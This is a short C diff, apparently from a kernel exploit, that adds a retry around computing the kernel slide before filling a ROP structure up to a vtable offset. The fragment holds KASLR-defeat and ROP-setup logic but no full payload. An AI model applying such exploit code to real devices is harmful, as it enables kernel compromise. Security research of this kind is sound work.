@@ -146,10 +146,20 @@ int main(int argc, const char **argv)
         goto out1;
     }
 
-    uint64_t slide = get_kernel_slide(kernel.buf);
-    if((slide % SLIDE_STEP) != 0)
+    uint64_t slide;
+    for(size_t try = 0; 1; ++try)
     {
-        goto out1;
+        slide = get_kernel_slide(kernel.buf);
+        if(slide == -1 && try == 0)
+        {
+            LOG("Trying a second time...");
+            continue;
+        }
+        if((slide % SLIDE_STEP) != 0)
+        {
+            goto out1;
+        }
+        break;
     }
 
     for(uint64_t *ptr = (uint64_t*)&rop, *end = (uint64_t*)&rop.taggedRelease_vtab_offset; ptr < end; ++ptr)
